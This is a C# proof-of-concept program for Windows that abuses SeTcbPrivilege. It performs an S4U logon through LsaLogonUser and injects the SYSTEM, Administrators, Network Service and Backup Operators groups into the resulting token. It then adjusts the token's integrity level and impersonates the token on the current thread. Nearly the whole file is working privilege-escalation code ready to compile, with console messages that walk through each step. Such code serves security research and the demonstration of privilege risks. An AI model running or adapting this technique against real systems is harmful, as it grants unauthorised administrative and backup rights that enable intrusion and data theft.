﻿using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Runtime.InteropServices;

namespace SeTcbPrivilegePoC
{
    using NTSTATUS = Int32;

    class SeTcbPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        enum MSV1_0_LOGON_SUBMIT_TYPE
        {
            MsV1_0InteractiveLogon = 2,
            MsV1_0Lm20Logon,
            MsV1_0NetworkLogon,
            MsV1_0SubAuthLogon,
            MsV1_0WorkstationUnlockLogon = 7,
            MsV1_0S4ULogon = 12,
            MsV1_0VirtualLogon = 82,
            MsV1_0NoElevationLogon = 83,
            MsV1_0LuidLogon = 84
        }

        [Flags]
        enum SE_GROUP_ATTRIBUTES : uint
        {
            MANDATORY = 0x00000001,
            ENABLED_BY_DEFAULT = 0x00000002,
            ENABLED = 0x00000004,
            OWNER = 0x00000008,
            USE_FOR_DENY_ONLY = 0x00000010,
            INTEGRITY = 0x00000020,
            INTEGRITY_ENABLED = 0x00000040,
            RESOURCE = 0x20000000,
            LOGON_ID = 0xC0000000
        }

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        enum SECURITY_LOGON_TYPE
        {
            UndefinedLogonType = 0,
            Interactive = 2,
            Network,
            Batch,
            Service,
            Proxy,
            Unlock,
            NetworkCleartext,
            NewCredentials,
            RemoteInteractive,
            CachedInteractive,
            CachedRemoteInteractive,
            CachedUnlock
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        /*
         * P/Invoke : Structs
         */
        [StructLayout(LayoutKind.Sequential)]
        struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPStr)]
            string Buffer;

            public LSA_STRING(string str)
            {
                Length = 0;
                MaximumLength = 0;
                Buffer = null;
                SetString(str);
            }

            public void SetString(string str)
            {
                if (str.Length > (ushort.MaxValue - 1))
                {
                    throw new ArgumentException("String too long for UnicodeString");
                }

                Length = (ushort)(str.Length);
                MaximumLength = (ushort)(str.Length + 1);
                Buffer = str;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }

            public LUID(ulong value)
            {
                LowPart = (uint)(value & 0xFFFFFFFFUL);
                HighPart = (uint)(value >> 32);
            }
        }

        class MSV1_0_S4U_LOGON : IDisposable
        {
            public IntPtr Buffer { get; } = IntPtr.Zero;
            public int Length { get; } = 0;

            private struct MSV1_0_S4U_LOGON_INNER
            {
                public MSV1_0_LOGON_SUBMIT_TYPE MessageType;
                public uint Flags;
                public UNICODE_STRING UserPrincipalName;
                public UNICODE_STRING DomainName;
            }

            public MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE type, uint flags, string upn, string domain)
            {
                int innerStructSize = Marshal.SizeOf(typeof(MSV1_0_S4U_LOGON_INNER));
                var pUpnBuffer = IntPtr.Zero;
                var pDomainBuffer = IntPtr.Zero;
                var innerStruct = new MSV1_0_S4U_LOGON_INNER
                {
                    MessageType = type,
                    Flags = flags
                };
                Length = innerStructSize;

                if (string.IsNullOrEmpty(upn))
                {
                    innerStruct.UserPrincipalName.Length = 0;
                    innerStruct.UserPrincipalName.MaximumLength = 0;
                }
                else
                {
                    innerStruct.UserPrincipalName.Length = (ushort)(upn.Length * 2);
                    innerStruct.UserPrincipalName.MaximumLength = (ushort)((upn.Length * 2) + 2);
                    Length += innerStruct.UserPrincipalName.MaximumLength;
                }

                if (string.IsNullOrEmpty(domain))
                {
                    innerStruct.DomainName.Length = 0;
                    innerStruct.DomainName.MaximumLength = 0;
                }
                else
                {
                    innerStruct.DomainName.Length = (ushort)(domain.Length * 2);
                    innerStruct.DomainName.MaximumLength = (ushort)((domain.Length * 2) + 2);
                    Length += innerStruct.DomainName.MaximumLength;
                }

                Buffer = Marshal.AllocHGlobal(Length);

                for (var offset = 0; offset < Length; offset++)
                    Marshal.WriteByte(Buffer, offset, 0);

                if (!string.IsNullOrEmpty(upn))
                {
                    if (Environment.Is64BitProcess)
                        pUpnBuffer = new IntPtr(Buffer.ToInt64() + innerStructSize);
                    else
                        pUpnBuffer = new IntPtr(Buffer.ToInt32() + innerStructSize);

                    innerStruct.UserPrincipalName.SetBuffer(pUpnBuffer);
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    if (Environment.Is64BitProcess)
                        pDomainBuffer = new IntPtr(Buffer.ToInt64() + innerStructSize + innerStruct.UserPrincipalName.MaximumLength);
                    else
                        pDomainBuffer = new IntPtr(Buffer.ToInt32() + innerStructSize + innerStruct.UserPrincipalName.MaximumLength);

                    innerStruct.DomainName.SetBuffer(pDomainBuffer);
                }

                Marshal.StructureToPtr(innerStruct, Buffer, true);

                if (!string.IsNullOrEmpty(upn))
                    Marshal.Copy(Encoding.Unicode.GetBytes(upn), 0, pUpnBuffer, upn.Length * 2);

                if (!string.IsNullOrEmpty(domain))
                    Marshal.Copy(Encoding.Unicode.GetBytes(domain), 0, pDomainBuffer, domain.Length * 2);
            }

            public void Dispose()
            {
                if (Buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(Buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct QUOTA_LIMITS
        {
            public uint PagedPoolLimit;
            public uint NonPagedPoolLimit;
            public uint MinimumWorkingSetSize;
            public uint MaximumWorkingSetSize;
            public uint PagefileLimit;
            public long TimeLimit;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public SID_AND_ATTRIBUTES[] Groups;

            public TOKEN_GROUPS(int privilegeCount)
            {
                GroupCount = privilegeCount;
                Groups = new SID_AND_ATTRIBUTES[8];
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;

            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public void SetBuffer(IntPtr pBuffer)
            {
                buffer = pBuffer;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("advapi32.dll")]
        static extern NTSTATUS LsaClose(IntPtr PolicyHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        static extern NTSTATUS LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        static extern NTSTATUS LsaFreeReturnBuffer(IntPtr buffer);

        [DllImport("secur32.dll")]
        static extern NTSTATUS LsaLogonUser(
            IntPtr LsaHandle,
            in LSA_STRING OriginName,
            SECURITY_LOGON_TYPE LogonType,
            uint AuthenticationPackage,
            IntPtr AuthenticationInformation,
            uint AuthenticationInformationLength,
            in TOKEN_GROUPS LocalGroups,
            in TOKEN_SOURCE SourceContext,
            out IntPtr ProfileBuffer,
            out uint ProfileBufferLength,
            out LUID LogonId,
            IntPtr Token, // [out] PHANDLE
            out QUOTA_LIMITS Quotas,
            out NTSTATUS SubStatus);

        [DllImport("secur32.dll", SetLastError = true)]
        static extern NTSTATUS LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            in LSA_STRING PackageName,
            out uint AuthenticationPackage);

        [DllImport("advapi32.dll")]
        static extern int LsaNtStatusToWinError(NTSTATUS ntstatus);

        [DllImport("ntdll.dll")]
        static extern NTSTATUS NtClose(IntPtr Handle);

        [DllImport("ntdll.dll")]
        static extern NTSTATUS NtQueryInformationToken(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength,
            out uint ReturnLength);

        [DllImport("ntdll.dll")]
        static extern NTSTATUS NtSetInformationToken(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            uint TokenInformationLength);

        [DllImport("kernel32.dll")]
        public static extern void SetLastError(int dwErrCode);

        /*
         * Win32 Consts
         */
        const NTSTATUS STATUS_SUCCESS = 0;
        static readonly NTSTATUS STATUS_BUFFER_TOO_SMALL = Convert.ToInt32("0xC0000023", 16);
        const string MSV1_0_PACKAGE_NAME = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";

        /*
         * User defined functions
         */
        static bool AdjustTokenIntegrityLevel(IntPtr hToken)
        {
            NTSTATUS ntstatus;
            IntPtr pDataBuffer;
            var nDataSize = (uint)Marshal.SizeOf(typeof(TOKEN_MANDATORY_LABEL));
            var status = false;

            do
            {
                pDataBuffer = Marshal.AllocHGlobal((int)nDataSize);
                ntstatus = NtQueryInformationToken(
                    WindowsIdentity.GetCurrent().Token,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    pDataBuffer,
                    nDataSize,
                    out nDataSize);

                if (ntstatus != STATUS_SUCCESS)
                    Marshal.FreeHGlobal(pDataBuffer);
            } while (ntstatus == STATUS_BUFFER_TOO_SMALL);

            if (ntstatus == STATUS_SUCCESS)
            {
                ntstatus = NtSetInformationToken(
                    hToken,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    pDataBuffer,
                    nDataSize);
                status = (ntstatus == STATUS_SUCCESS);
                Marshal.FreeHGlobal(pDataBuffer);
            }

            return status;
        }


        static bool CompareIgnoreCase(string strA, string strB)
        {
            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
        }


        public static IntPtr GetMsvS4uLogonToken(string upn, string domain)
        {
            var hS4uLogonToken = IntPtr.Zero;

            do
            {
                var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
                var tokenGroups = new TOKEN_GROUPS(6);

                NTSTATUS ntstatus = LsaConnectUntrusted(out IntPtr hLsa);

                if (ntstatus != STATUS_SUCCESS)
                {
                    SetLastError(LsaNtStatusToWinError(ntstatus));
                    break;
                }

                ntstatus = LsaLookupAuthenticationPackage(hLsa, in pkgName, out uint authnPkg);

                if (ntstatus != STATUS_SUCCESS)
                {
                    LsaClose(hLsa);
                    SetLastError(LsaNtStatusToWinError(ntstatus));
                    break;
                }

                ConvertStringSidToSid("S-1-1-0", out IntPtr pEveryoneSid);
                ConvertStringSidToSid("S-1-5-11", out IntPtr pAuthenticatedUsersSid);
                ConvertStringSidToSid("S-1-5-18", out IntPtr pLocalSystemSid);
                ConvertStringSidToSid("S-1-5-20", out IntPtr pNetworkServiceSid);
                ConvertStringSidToSid("S-1-5-32-544", out IntPtr pAdminSid);
                ConvertStringSidToSid("S-1-5-32-551", out IntPtr pBackupOperatorSid);

                tokenGroups.Groups[0].Sid = pEveryoneSid;
                tokenGroups.Groups[0].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[1].Sid = pAuthenticatedUsersSid;
                tokenGroups.Groups[1].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[2].Sid = pLocalSystemSid;
                tokenGroups.Groups[2].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[3].Sid = pNetworkServiceSid;
                tokenGroups.Groups[3].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[4].Sid = pAdminSid;
                tokenGroups.Groups[4].Attributes = (int)(SE_GROUP_ATTRIBUTES.OWNER | SE_GROUP_ATTRIBUTES.ENABLED);
                tokenGroups.Groups[5].Sid = pBackupOperatorSid;
                tokenGroups.Groups[5].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);

                using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
                {
                    IntPtr pTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);
                    var originName = new LSA_STRING("S4U");
                    var tokenSource = new TOKEN_SOURCE("User32");
                    ntstatus = LsaLogonUser(
                        hLsa,
                        in originName,
                        SECURITY_LOGON_TYPE.Network,
                        authnPkg,
                        msv.Buffer,
                        (uint)msv.Length,
                        in tokenGroups,
                        in tokenSource,
                        out IntPtr ProfileBuffer,
                        out uint _,
                        out LUID _,
                        pTokenBuffer,
                        out QUOTA_LIMITS _,
                        out NTSTATUS _);
                    LsaFreeReturnBuffer(ProfileBuffer);
                    LsaClose(hLsa);

                    if (ntstatus != STATUS_SUCCESS)
                        SetLastError(LsaNtStatusToWinError(ntstatus));
                    else
                        hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);

                    Marshal.FreeHGlobal(pTokenBuffer);
                }

                LocalFree(pEveryoneSid);
                LocalFree(pAuthenticatedUsersSid);
                LocalFree(pLocalSystemSid);
                LocalFree(pNetworkServiceSid);
                LocalFree(pAdminSid);
                LocalFree(pBackupOperatorSid);
            } while (false);

            return hS4uLogonToken;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            var pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                    {
                        pNtdll = module.BaseAddress;
                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                        break;
                    }
                }
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            else
                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
        }


        static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
        {
            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
            bool status = ImpersonateLoggedOnUser(hImpersonationToken);

            if (status)
            {
                NTSTATUS ntstatus = NtQueryInformationToken(
                    WindowsIdentity.GetCurrent().Token,
                    TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                    pImpersonationLevel,
                    4u,
                    out uint _);
                status = (ntstatus == STATUS_SUCCESS);

                if (status)
                {
                    var level = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    if (level == SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation)
                        status = true;
                    else if (level == SECURITY_IMPERSONATION_LEVEL.SecurityDelegation)
                        status = true;
                    else
                        status = false;
                }
            }

            Marshal.FreeHGlobal(pImpersonationLevel);

            return status;
        }


        static void Main()
        {
            int error;
            bool status;
            IntPtr hS4uToken;

            Console.WriteLine("[*] If you have SeTcbPrivilege, you can perform S4U Logon.");
            Console.WriteLine("[*] This PoC tries to perform S4U Logon and add \"Builtin\\Backup Operators\" to current token group.");

            Console.WriteLine("[>] Trying to create S4U logon token.");

            hS4uToken = GetMsvS4uLogonToken(Environment.UserName, Environment.UserDomainName);

            if (hS4uToken == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to create S4U logon token.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                return;
            }
            else
            {
                Console.WriteLine("[+] Got S4U logon token (Handle = 0x{0}).", hS4uToken.ToString("X"));
            }

            Console.WriteLine("[>] Trying to adjust token integrity level for S4U logon token.");

            status = AdjustTokenIntegrityLevel(hS4uToken);

            if (!status)
            {
                Console.WriteLine("[-] Failed to adjust token integrity level.");
                return;
            }
            else
            {
                Console.WriteLine("[+] Token integrity level is adjusted successfully.");
            }

            Console.WriteLine("[>] Trying to thread impersonation.");

            status = ImpersonateThreadToken(hS4uToken);
            NtClose(hS4uToken);

            if (!status)
            {
                Console.WriteLine("[-] Failed to thread impersonation.");
            }
            else
            {
                Console.WriteLine("[*] Check this thread's token with TokenViewer.exe.");
                Console.WriteLine("[*] You can confirm that \"Builtin\\Backup Operators\" is added to this thread.");
                Console.WriteLine("\n[*] To exit this program, hit [ENTER] key.");
                Console.ReadLine();
            }
        }
    }
}
